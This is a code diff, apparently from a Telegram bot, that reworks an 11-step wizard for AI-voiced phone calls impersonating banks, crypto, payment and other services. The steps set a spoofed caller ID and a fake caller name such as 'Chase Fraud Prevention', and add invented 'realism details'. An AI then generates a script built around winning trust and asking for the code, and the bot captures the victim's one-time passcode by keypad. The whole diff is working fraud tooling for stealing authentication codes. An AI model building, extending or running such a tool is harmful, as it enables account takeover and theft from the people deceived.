+        buttons = types.InlineKeyboardMarkup(row_width=2)
+        scenarios = [
+            ("🏦 Bank", "bank"), ("🪙 Crypto", "crypto"), ("🛒 E-commerce", "ecommerce"),
+            ("✉️ Email", "email"), ("💳 Payment", "payment"), ("📱 Social", "social"),
+            ("🏢 Corporate", "corporate"), ("⚙️ Other", "other"),
+        ]
+        for label, key in scenarios:
+            buttons.add(types.InlineKeyboardButton(label, callback_data=f"manual_scen_{key}"))
+        bot.send_message(
+            message.chat.id,
+            "✅ Phone saved.\n\n🎯 <b>Step 4 of 11:</b> Scenario\n\n"
+            "What triggered the call? This sets the reason the AI can defend.\n"
+            "Select one below:",
+            reply_markup=buttons,
+            parse_mode="HTML",
+        )
         return
 
-    if state == "manual_call_step_2_callerid":
+    if state == "manual_call_step_5_urgency":
+        urgency = text.strip().lower()
+        if urgency not in ("high", "medium", "low"):
+            bot.send_message(message.chat.id, "❌ Use the buttons or type high / medium / low.")
+            return
+        write_user_file(user_id_str, "urgency.txt", urgency)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_6_callerid")
+        bot.send_message(
+            message.chat.id,
+            "✅ Urgency saved.\n\n📞 <b>Step 6 of 11:</b> Caller ID\n\n"
+            "The number that shows on the target's phone. Send /skip to use the default.\n"
+            "Example: <code>+18009359935</code>",
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "manual_call_step_6_callerid":
         caller_input = text.strip()
         if caller_input.lower() in ("skip", "/skip", ""):
             caller = TWILIO_PHONE_NUMBER
@@ -6287,12 +6631,139 @@ def handle_stateful_text(message):
                 bot.send_message(message.chat.id, "❌ Invalid caller ID. Use +1234567890 or /skip")
                 return
         write_user_file(user_id_str, "manual_caller_id.txt", caller)
-        set_user_state(user_id_str, "manual_call_step_3_script_choice")
+        write_user_file(user_id_str, "Caller ID.txt", caller)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_7_displayname")
+        bot.send_message(
+            message.chat.id,
+            "✅ Caller ID saved.\n\n💠 <b>Step 7 of 11:</b> Display Name\n\n"
+            "The name the agent uses as the caller identity. Send /skip to use the default.\n"
+            "Example: <code>Chase Fraud Prevention</code>",
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "manual_call_step_7_displayname":
+        display = text.strip()
+        if display.lower() in ("skip", "/skip", ""):
+            display = ""
+        write_user_file(user_id_str, "manual_display_name.txt", display)
+        write_user_file(user_id_str, "From Name.txt", display)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_8_details")
+        bot.send_message(
+            message.chat.id,
+            "✅ Display name saved.\n\n🎯 <b>Step 8 of 11:</b> Optional Realism Details\n\n"
+            "Send details separated by <code>;</code> to make the story bulletproof, "
+            "or send /skip for smart defaults.\n\n"
+            "Format: <code>City, State; Account Type; Amount; Suspicious Activity</code>\n"
+            "Example: <code>New York, NY; Checking Account; $2,500; Login from unrecognized device</code>\n\n"
+            "Note: details are auto-validated against your scenario — mismatched values are dropped, so the call always stays believable.",
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "manual_call_step_8_details":
+        raw = text.strip()
+        if raw.lower() in ("skip", "/skip", ""):
+            raw = ""
+        details = {
+            "city": "", "state": "", "account_type": "",
+            "amount": "", "activity": "",
+        }
+        if raw:
+            parts = [p.strip() for p in re.split(r"[;,]", raw)]
+            if len(parts) >= 1 and parts[0]:
+                addr = re.split(r"\s*,\s*", parts[0])
+                details["city"] = addr[0].strip()
+                if len(addr) > 1:
+                    details["state"] = addr[1].strip()[:2]
+            if len(parts) >= 2:
+                details["account_type"] = parts[1]
+            if len(parts) >= 3:
+                details["amount"] = parts[2]
+            if len(parts) >= 4:
+                details["activity"] = parts[3]
+        for key, val in details.items():
+            write_user_file(user_id_str, f"manual_detail_{key}.txt", val)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_9_reason_choice")
         buttons = types.InlineKeyboardMarkup(row_width=1)
-        buttons.add(types.InlineKeyboardButton("✍️ Paste custom script", callback_data="script_paste"))
-        buttons.add(types.InlineKeyboardButton("📚 Select saved script", callback_data="manual_script_library"))
+        buttons.add(types.InlineKeyboardButton("🤖 AI Builds it — type a reason", callback_data="manual_ai_reason"))
+        buttons.add(types.InlineKeyboardButton("✍️ I'll write the flow", callback_data="script_paste"))
+        buttons.add(types.InlineKeyboardButton("📚 Reuse a saved call", callback_data="manual_script_library"))
         buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
-        bot.send_message(message.chat.id, "💠 Step 3/8: Script\nChoose whether to paste a new script or select one from your library.", reply_markup=buttons)
+        bot.send_message(
+            message.chat.id,
+            "✅ Details saved.\n\n🎭 <b>Step 9 of 11:</b> THE REASON\n\n"
+            "Give the AI the reason for this call — the more detail, the more real it sounds.\n"
+            "One line like: <i>\"we flagged a $2,500 withdrawal from New York on a checking account\"</i>\n\n"
+            "The AI builds the whole call around your reason — greeting, trust, and the code ask. "
+            "You don't write dialogue; you give the story.",
+            reply_markup=buttons,
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "manual_call_ai_reason":
+        reason = text.strip()
+        if not reason or len(reason) > 400:
+            bot.send_message(message.chat.id, "❌ Give a reason between 1 and 400 characters.")
+            return
+        bot.send_message(message.chat.id, "⏳ AI is building the call around your reason…")
+        def _ai_build():
+            edit_mode = _manual_edit_mode(user_id_str)
+            try:
+                from services.script_generator import generate_script
+                from services.reason_engine import generate_facts
+                write_user_file(user_id_str, "manual_reason.txt", reason)
+                scenario = read_user_file(user_id_str, "manual_scenario.txt", "").strip() or "bank"
+                facts = generate_facts(
+                    scenario=scenario,
+                    company=read_user_file(user_id_str, "manual_company.txt", ""),
+                    overrides={
+                        "city": read_user_file(user_id_str, "manual_detail_city.txt", "").strip() or None,
+                        "state": read_user_file(user_id_str, "manual_detail_state.txt", "").strip() or None,
+                        "amount": read_user_file(user_id_str, "manual_detail_amount.txt", "").strip() or None,
+                        "device": read_user_file(user_id_str, "manual_detail_activity.txt", "").strip() or None,
+                    },
+                )
+                ctx = {
+                    "name": read_user_file(user_id_str, "manual_name.txt", "Customer"),
+                    "company": read_user_file(user_id_str, "manual_company.txt", "your bank"),
+                    "agent": select_agent_name(read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID)) if 'select_agent_name' in globals() else "",
+                    "code_length": read_user_file(user_id_str, "manual_otp_length.txt", "6"),
+                    "scenario": scenario,
+                    "facts": facts,
+                }
+                result = generate_script(reason, ctx=ctx)
+                script = result.get("script") or reason
+                write_user_file(user_id_str, "manual_script.txt", script)
+                note = result.get("note") or ""
+                if edit_mode:
+                    _manual_edit_return(user_id_str, message.chat.id)
+                    if note:
+                        bot.send_message(message.chat.id, f"⚠️ {note}")
+                    return
+                set_user_state(user_id_str, "manual_call_step_10_voice")
+                msg = "✅ AI built your call. Ready for the voice step."
+                if note:
+                    msg = f"{msg}\n⚠️ {note}"
+                bot.send_message(message.chat.id, msg)
+                try:
+                    from menu_utils import build_voice_selection_keyboard
+                    keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
+                    bot.send_message(message.chat.id, "🎤 <b>Step 10 of 11:</b> Voice Selection\nChoose a voice or send its number/name.", reply_markup=keyboard, parse_mode="HTML")
+                except Exception:
+                    bot.send_message(message.chat.id, "🎤 <b>Step 10 of 11:</b> Voice Selection\nSend the voice number or name now.", parse_mode="HTML")
+            except Exception as e:
+                logger.exception("Manual AI build failed")
+                bot.send_message(message.chat.id, f"❌ AI build failed: {e}")
+                set_user_state(user_id_str, "manual_call_step_9_reason_choice")
+        threading.Thread(target=_ai_build, daemon=True).start()
         return
 
     if state == "manual_call_step_3_script_input":
@@ -6310,7 +6781,33 @@ def handle_stateful_text(message):
             bot.send_message(message.chat.id, "Send the voice number or name now.")
         return
 
-    if state == "manual_call_step_4_voice":
+    if state == "manual_call_step_9_flow_input":
+        if not text:
+            bot.send_message(message.chat.id, "❌ Flow cannot be empty.")
+            return
+        from services.script_generator import enhance_call
+        try:
+            flow = enhance_call(text)
+        except Exception:
+            flow = text
+        write_user_file(user_id_str, "manual_script.txt", flow)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
+        set_user_state(user_id_str, "manual_call_step_10_voice")
+        bot.send_message(
+            message.chat.id,
+            "✅ Flow saved & AI-polished.\n\n🎤 <b>Step 10 of 11:</b> Voice Selection\nChoose a voice or send its number/name.",
+            parse_mode="HTML",
+        )
+        try:
+            from menu_utils import build_voice_selection_keyboard
+            keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
+            bot.send_message(message.chat.id, "Select a voice:", reply_markup=keyboard)
+        except Exception:
+            bot.send_message(message.chat.id, "Send the voice number or name now.")
+        return
+
+    if state == "manual_call_step_10_voice":
         _, voice_id, voice_name = resolve_voice_choice(text)
         if not voice_id:
             bot.send_message(message.chat.id, "❌ Voice not recognized. Reply with number or full name.")
@@ -6323,33 +6820,27 @@ def handle_stateful_text(message):
             return
         write_user_file(user_id_str, "manual_voice_id.txt", voice_id)
         write_user_file(user_id_str, "manual_voice_name.txt", voice_name)
-        set_user_state(user_id_str, "manual_call_step_5_digits")
-        bot.send_message(message.chat.id, "💠 Step 5/8: DTMF Capture\nHow many digits should the bot collect? Reply 0 for none.")
-        return
-
-    if state == "manual_call_step_5_digits":
-        if not text.isdigit() or int(text) < 0 or int(text) > 10:
-            bot.send_message(message.chat.id, "❌ Enter a digit count between 0 and 10.")
+        write_user_file(user_id_str, "manual_voice_provider.txt", "vapi")
+        if _manual_edit_return(user_id_str, message.chat.id):
             return
-        write_user_file(user_id_str, "manual_digits.txt", text)
-        set_user_state(user_id_str, "manual_call_step_6_delay")
-        bot.send_message(message.chat.id, "💠 Step 6/8: Delay Before Speaking\nEnter delay in seconds (0-10).")
+        set_user_state(user_id_str, "manual_call_step_11_otp")
+        bot.send_message(
+            message.chat.id,
+            "✅ Voice saved.\n\n🔢 <b>Step 11 of 11:</b> OTP Code Length\n\n"
+            "How many digits should the code be? 4–10. This drives the script wording "
+            "and the live DTMF/OTP capture.\nExample: <code>6</code>",
+            parse_mode="HTML",
+        )
         return
 
-    if state == "manual_call_step_6_delay":
-        if not text.isdigit() or int(text) < 0 or int(text) > 15:
-            bot.send_message(message.chat.id, "❌ Enter a number between 0 and 15.")
+    if state == "manual_call_step_11_otp":
+        if not text.isdigit() or not (4 <= int(text) <= 10):
+            bot.send_message(message.chat.id, "❌ Enter a number between 4 and 10.")
             return
-        write_user_file(user_id_str, "manual_delay.txt", text)
-        set_user_state(user_id_str, "manual_call_step_7_fallback")
-        bot.send_message(message.chat.id, "💠 Step 7/8: Fallback Message\nEnter a fallback message that will play if no input is received, or send NONE.")
-        return
-
-    if state == "manual_call_step_7_fallback":
-        fallback_text = text.strip()
-        if fallback_text.lower() == "none":
-            fallback_text = ""
-        write_user_file(user_id_str, "manual_fallback.txt", fallback_text)
+        write_user_file(user_id_str, "manual_otp_length.txt", text)
+        write_user_file(user_id_str, "CodeLength.txt", text)
+        if _manual_edit_return(user_id_str, message.chat.id):
+            return
         clear_user_state(user_id_str)
         send_manual_call_ready_panel(message.chat.id, user_id_str)
         return
@@ -6366,12 +6857,17 @@ def handle_stateful_text(message):
                 bot.send_message(message.chat.id, "❌ Time must be in the future.")
                 return
             manual_params = {
+                "name": read_user_file(user_id_str, "manual_name.txt", ""),
+                "company": read_user_file(user_id_str, "manual_company.txt", ""),
                 "script": read_user_file(user_id_str, "manual_script.txt", ""),
                 "voice_id": read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID),
                 "caller_id": read_user_file(user_id_str, "manual_caller_id.txt", TWILIO_PHONE_NUMBER),
-                "delay": read_user_file(user_id_str, "manual_delay.txt", "0"),
-                "fallback": read_user_file(user_id_str, "manual_fallback.txt", ""),
-                "digits": read_user_file(user_id_str, "manual_digits.txt", "0"),
+                "from_name": read_user_file(user_id_str, "From Name.txt", ""),
+                "code_length": read_user_file(user_id_str, "CodeLength.txt", "6"),
+                "scenario": read_user_file(user_id_str, "Scenario.txt", ""),
+                "urgency": read_user_file(user_id_str, "urgency.txt", ""),
+                "language": read_user_file(user_id_str, "Language.txt", ""),
+                "delivery": read_user_file(user_id_str, "Delivery.txt", ""),
             }
             if not manual_params["script"]:
                 bot.send_message(message.chat.id, "❌ No manual script configured. Please complete the manual setup first.")
